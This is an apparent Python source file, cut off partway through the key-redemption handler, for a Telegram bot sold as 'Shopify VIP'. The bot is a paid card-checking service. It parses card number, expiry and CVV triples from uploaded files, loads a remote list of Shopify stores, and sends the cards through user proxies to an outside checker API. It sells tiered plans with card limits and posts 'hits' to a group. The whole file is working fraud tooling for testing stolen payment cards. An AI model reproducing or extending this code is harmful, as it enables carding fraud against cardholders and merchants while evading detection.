# ==============================================================================
# 𝘚𝘎𝘎 - SHOPIFY VIP BOT PRODUCTION SYSTEM (PTB NATIVE STYLES + CUSTOM EMOJIS)
# ==============================================================================
import asyncio, aiohttp, aiofiles, os, random, time, json, re, io, logging, sys
from datetime import datetime, timedelta
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, CommandHandler, filters, ContextTypes
from telegram.error import RetryAfter, Conflict, BadRequest

from database2 import (init_db, ensure_user, get_user_plan, set_user_plan, get_all_user_proxies, add_proxy_db, remove_proxy_by_index, clear_all_proxies, mark_user_joined)

logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("ShopifyVIP")

# ----------------- CONFIG & GLOBALS -----------------
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808").split(",") if x.strip()]
JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS, DELAY, HIT_DELAY = 40, 2.0, 0.5
_SITE_ERRORS_COUNT, _MAX_SITE_ERRORS, _JOIN_CACHE, _MAINTENANCE_MODE = {}, 4, {}, False
bot_instance = None

# ====================== CUSTOM PREMIUM EMOJIS ======================
CE_1 = '<tg-emoji emoji-id="5916025950809625537">✨</tg-emoji>'
CE_2 = '<tg-emoji emoji-id="6028356293540977715">⚡</tg-emoji>'
CE_3 = '<tg-emoji emoji-id="5918248669399754192">👑</tg-emoji>'
CE_4 = '<tg-emoji emoji-id="5917785839428967062">✅</tg-emoji>'
CE_5 = '<tg-emoji emoji-id="5794073296492303710">🟢</tg-emoji>'
CE_6 = '<tg-emoji emoji-id="5445059250382469069">🟡</tg-emoji>'
CE_7 = '<tg-emoji emoji-id="5445388803223091254">🔴</tg-emoji>'
CE_8 = '<tg-emoji emoji-id="5260681660189408650">💳</tg-emoji>'
CE_9 = '<tg-emoji emoji-id="6201647288947839133">⭐</tg-emoji>'
CE_10 = '<tg-emoji emoji-id="5445189224682779974">🔥</tg-emoji>'
CE_11 = '<tg-emoji emoji-id="5445358884480916784">⚙️</tg-emoji>'
CE_12 = '<tg-emoji emoji-id="5447453226498552490">📊</tg-emoji>'
CE_13 = '<tg-emoji emoji-id="5445163772706582819">🚀</tg-emoji>'
CE_14 = '<tg-emoji emoji-id="5447311106030726740">⏱</tg-emoji>'

# ====================== ANIME GIFs LIBRARY ======================
WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
ACTIVATION_GIF = "https://media.giphy.com/media/l41YkxvU8c7J7Bba0/giphy.gif"

ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif",
    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif"
]

PLANS = {
    "plan1": {"name": "𝘊𝘰𝘳𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "𝘌𝘭𝘪𝘵𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "𝘙𝘰𝘰𝘵 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "𝘟-𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]
USER_LAST_REQ, ACTIVE_MTXT_PROCESSES, PENDING_FILES = {}, {}, {}

_system_locks = {}
def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

# ----------------- UTILS & DB -----------------
def create_native_button(text, callback_data=None, url=None):
    if url: return InlineKeyboardButton(text, url=url)
    return InlineKeyboardButton(text, callback_data=callback_data)

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except: return {}
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        async with aiofiles.open(KEYS_FILE, 'w') as f:
            await f.write(json.dumps(keys_data, indent=4))

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)

# ----------------- PTB STYLING ENGINE -----------------
async def styled_reply(update: Update, text: str, buttons=None, use_gif=False, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    
    if use_gif or specific_gif:
        url = specific_gif or random.choice(ANIME_GIFS)
        try: 
            return await target.reply_animation(animation=url, caption=text, reply_markup=markup, parse_mode="HTML")
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
            return await target.reply_animation(animation=url, caption=text, reply_markup=markup, parse_mode="HTML")
        except Exception: pass
            
    try: 
        return await target.reply_text(text=text, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except Exception: return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    try:
        if msg.animation or msg.photo or msg.video or msg.document: 
            return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
        return await msg.edit_text(text=text, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except RetryAfter as e: 
        await asyncio.sleep(e.retry_after + 1)
    except Exception: return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=False, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    if use_gif or specific_gif:
        url = specific_gif or random.choice(ANIME_GIFS)
        try: 
            return await bot.send_animation(chat_id=chat_id, animation=url, caption=text, reply_markup=markup, parse_mode="HTML")
        except Exception: pass
            
    try: 
        return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except Exception: return None

# ----------------- NETWORK & EXTRACTION -----------------
_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=15), connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

def format_proxy_for_api(proxy):
    if not proxy: return ""
    if isinstance(proxy, dict):
        if proxy.get('username') and proxy.get('password'): return f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
        return f"{proxy['ip']}:{proxy['port']}"
    if isinstance(proxy, str):
        clean = proxy.strip()
        if "://" in clean:
            try: return urlparse(clean).netloc
            except: return clean
        return clean
    return ""

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers=headers, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                    _LAST_SITES_FETCH = now
    except: pass
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
        except: pass
    return _CACHED_SITES

_DEAD_INDICATORS = ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error')

def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

# ----------------- SECURITY & JOIN CHECK -----------------
async def is_user_joined(uid, bot):
    if JOIN_CHANNEL_ID in ["0", ""] and JOIN_GROUP_ID in ["0", ""]: return True
    for chat_id in [JOIN_CHANNEL_ID, JOIN_GROUP_ID]:
        if str(chat_id) in ["0", ""]: continue
        try:
            try: cid = int(chat_id)
            except: cid = str(chat_id)
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: return False 
    return True

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    if await is_user_joined(uid, context.bot):
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if JOIN_CHANNEL_LINK and str(JOIN_CHANNEL_ID) not in ["0", ""]: kb.append([create_native_button("⦗ 📢 ⦘ 𝘑𝘰𝘪𝘯 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", url=JOIN_CHANNEL_LINK)])
    if JOIN_GROUP_LINK and str(JOIN_GROUP_ID) not in ["0", ""]: kb.append([create_native_button("⦗ 💬 ⦘ 𝘑𝘰𝘪𝘯 𝘎𝘳𝘰𝘶𝘱", url=JOIN_GROUP_LINK)])
    if not kb: return True
    kb.append([create_native_button("⦗ ✅ ⦘ 𝘝𝘦𝘳𝘪𝘧𝘺", callback_data="check_joined")])
    
    await styled_reply(update, f"⦗ {CE_7} ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘋𝘦𝘯𝘪𝘦𝘥\n\n├ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘫𝘰𝘪𝘯 𝘰𝘶𝘳 𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘧𝘪𝘳𝘴𝘵.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘫𝘰𝘪𝘯, 𝘵𝘩𝘦𝘯 𝘤𝘭𝘪𝘤𝘬 '𝘝𝘦𝘳𝘪𝘧𝘺'.", buttons=kb, use_gif=True)
    return False

# ----------------- NATIVE COMMAND HANDLERS -----------------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: 
        return await styled_reply(update, f"⦗ {CE_11} ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦\n\n├ 𝘛𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘤𝘶𝘳𝘳𝘦𝘯𝘵𝘭𝘺 𝘶𝘯𝘥𝘦𝘳𝘨𝘰𝘪𝘯𝘨 𝘶𝘱𝘨𝘳𝘢𝘥𝘦𝘴.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯 𝘭𝘢𝘵𝘦𝘳.", use_gif=True)
    
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    await ensure_user(uid)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    
    admin_panel = f"\n\n⦗ {CE_3} ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n├ /gen [plan] [qty]\n├ /validate [key]\n├ /users\n╰ /maint" if uid in ADMIN_ID else ""

    text = f"""⦗ {CE_2} ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

⦗ {CE_8} ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

⦗ {CE_11} ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺
├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{admin_panel}

⦗ {CE_9} ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""

    kb = [[create_native_button("⦗ 💎 ⦘ 𝘝𝘪𝘦𝘸 𝘗𝘭𝘢𝘯𝘴", callback_data="show_plans")], [create_native_button("⦗ 📢 ⦘ 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", url=JOIN_CHANNEL_LINK), create_native_button("⦗ 💬 ⦘ 𝘎𝘳𝘰𝘶𝘱", url=JOIN_GROUP_LINK)]]
    await styled_reply(update, text, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    await ensure_user(uid)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    text = f"""⦗ 👤 ⦘ 𝘗𝘳𝘰𝘧𝘪𝘭𝘦 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ ⦗ 🆔 ⦘ 𝘐𝘋: <code>{uid}</code>
├ ⦗ {CE_2} ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{'Active' if is_paid_plan(plan) else 'Free'}</code>
├ ⦗ {CE_1} ⦘ 𝘗𝘭𝘢𝘯: <code>{plan.title() if plan else 'Bronze'}</code>
╰ ⦗ {CE_8} ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>"""
    await styled_reply(update, text, use_gif=True)

async def plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    cp = await get_user_plan(uid)
    plans_text = f"⦗ {CE_9} ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for _, pi in PLANS.items():
        plans_text += f"├ ⦗ {CE_1} ⦘ <code>{pi['name']}</code>\n"
        plans_text += f"│ ├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
        plans_text += f"│ ├ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n"
        plans_text += f"│ ╰ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    plans_text += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[create_native_button("⦗ 👑 ⦘ 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳", url="https://t.me/Dddadddyttt")], [create_native_button("⦗ 🔙 ⦘ 𝘉𝘢𝘤𝘬", callback_data="back_start")]]
    await styled_reply(update, plans_text, buttons=kb, use_gif=True)

async def fb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    text = " ".join(context.args) if context.args else ""
    
    if not text and not update.message.reply_to_message: 
        return await styled_reply(update, f"⚠️ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦.", use_gif=True)
    
    admin = ADMIN_ID[0] if ADMIN_ID else None
    if admin:
        try:
            if update.message.reply_to_message:
                await context.bot.forward_message(chat_id=admin, from_chat_id=uid, message_id=update.message.reply_to_message.message_id)
                if text: await context.bot.send_message(admin, f"💬 𝘕𝘰𝘵𝘦: {text}\n📩 𝘍𝘳𝘰𝘮: <code>{uid}</code>", parse_mode="HTML")
                else: await context.bot.send_message(admin, f"📩 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬 𝘍𝘳𝘰𝘮: <code>{uid}</code>", parse_mode="HTML")
            else:
                await context.bot.forward_message(chat_id=admin, from_chat_id=uid, message_id=update.message.message_id)
                await context.bot.send_message(admin, f"📩 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬 𝘍𝘳𝘰𝘮: <code>{uid}</code>", parse_mode="HTML")
        except Exception: pass
            
    await styled_reply(update, f"⦗ {CE_4} ⦘ 𝘠𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘥𝘦𝘭𝘪𝘷𝘦𝘳𝘦𝘥 𝘵𝘰 𝘵𝘩𝘦 𝘖𝘸𝘯𝘦𝘳.", use_gif=True)

async def addpxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    lines = []
    
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            fp = f"px_{uid}.txt"
            await f.download_to_drive(fp)
            try:
                async with aiofiles.open(fp, "r", encoding="utf-8") as file: lines = (await file.read()).split()
            except: pass
            if os.path.exists(fp): os.remove(fp)
        else:
            raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
            lines = raw_rep.split()
    else:
        if context.args: lines = context.args
        else: return await styled_reply(update, f"⚠️ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘤𝘰𝘳𝘳𝘦𝘤𝘵𝘭𝘺.", use_gif=True)
    
    if not lines: return await styled_reply(update, f"⚠️ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘧𝘰𝘶𝘯𝘥.", use_gif=True)
    
    db_proxies = await get_all_user_proxies(uid)
    existing_urls = {p['proxy_url'] for p in db_proxies} if db_proxies else set()
    cc = len(existing_urls)
    if cc >= 100: return await styled_reply(update, f"⚠️ 𝘓𝘪𝘮𝘪𝘵 100/100 𝘳𝘦𝘢𝘤𝘩𝘦𝘥.", use_gif=True)
    
    parsed = []
    for l in lines:
        px = parse_proxy_format(l)
        if px and px['proxy_url'] not in existing_urls:
            parsed.append(px)
            existing_urls.add(px['proxy_url'])
            
    if not parsed: return await styled_reply(update, f"⚠️ 𝘈𝘭𝘭 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘢𝘳𝘦 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘥𝘥𝘦𝘥 𝘰𝘳 𝘪𝘯𝘷𝘢𝘭𝘪𝘥.", use_gif=True)
    parsed = parsed[:100-cc]
    tm = await styled_reply(update, f"⦗ {CE_11} ⦘ 𝘈𝘥𝘥𝘪𝘯𝘨 𝘱𝘳𝘰𝘹𝘪𝘦𝘴...")
    added = 0
    for pd2 in parsed:
        await add_proxy_db(uid, pd2)
        added += 1
    await styled_edit(tm, f"⦗ {CE_4} ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘈𝘥𝘥𝘦𝘥: <code>{added}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴")

async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    proxies = await get_all_user_proxies(uid)
    if not proxies: return await styled_reply(update, f"⚠️ 𝘠𝘰𝘶 𝘥𝘰𝘯'𝘵 𝘩𝘢𝘷𝘦 𝘢𝘯𝘺 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘢𝘷𝘦𝘥.", use_gif=True)
    text = f"⦗ 🛡 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 ({len(proxies)}/100)\n\n"
    for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> <code>{p['ip']}:{p['port']}</code>\n"
    if len(proxies) > 30: text += f"\n+{len(proxies)-30} 𝘮𝘰𝘳𝘦..."
    await styled_reply(update, text, use_gif=True)

async def rmpxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    proxies = await get_all_user_proxies(uid)
    if not proxies: return await styled_reply(update, f"⚠️ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘵𝘰 𝘳𝘦𝘮𝘰𝘷𝘦.", use_gif=True)
    
    if not context.args: return await styled_reply(update, f"⚠️ 𝘚𝘱𝘦𝘤𝘪𝘧𝘺 'all' 𝘰𝘳 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
    arg = context.args[0].lower()
    if arg == 'all':
        c = await clear_all_proxies(uid)
        return await styled_reply(update, f"⦗ {CE_4} ⦘ 𝘊𝘭𝘦𝘢𝘳𝘦𝘥 <code>{c}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺.", use_gif=True)
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            await remove_proxy_by_index(uid, idx)
            await styled_reply(update, f"⦗ {CE_4} ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘳𝘦𝘮𝘰𝘷𝘦𝘥.", use_gif=True)
        else: await styled_reply(update, f"⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
    except: await styled_reply(update, f"⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)

async def gen_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_ID: return
    if not context.args: return await styled_reply(update, f"⚠️ 𝘜𝘴𝘢𝘨𝘦: /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳]", use_gif=True)
    plan_key = context.args[0].lower()
    amount = int(context.args[1]) if len(context.args) > 1 else 1
    
    if plan_key not in PLANS: return await styled_reply(update, f"⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘗𝘭𝘢𝘯. 𝘜𝘴𝘦: plan1, plan2, plan3, plan4", use_gif=True)
        
    pi = PLANS[plan_key]
    keys_db = await load_keys()
    generated_codes = []
    
    for _ in range(amount):
        rand_str = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
        code = f"𝘚𝘩𝘰𝘱𝘪𝘧𝘺-{rand_str[:5]}-{rand_str[5:]}"
        keys_db[code] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        generated_codes.append(code)
        
    await save_keys(keys_db)
    
    text = f"⦗ {CE_4} ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 <code>{amount}</code> 𝘒𝘦𝘺(𝘴)!\n\n"
    text += f"├ ⦗ {CE_1} ⦘ 𝘗𝘭𝘢𝘯: <code>{pi['name']}</code>\n"
    text += f"├ ⦗ {CE_14} ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n"
    text += f"╰ ⦗ {CE_8} ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n\n"
    
    for c in generated_codes: text += f"<code>{c}</code>\n"
    await styled_reply(update, text, use_gif=True)

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    if not await force_join_check(update, context): return
    uid = update.effective_user.id
    code = context.args[0].strip() if context.args else ""
    
    if not code: return await styled_reply(update, f"⚠️ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘺𝘰𝘶𝘳 𝘬𝘦𝘺: <code>/redeem [𝘒𝘦𝘺]</code>", use_gif=True)
    
    keys_db = await load_keys()
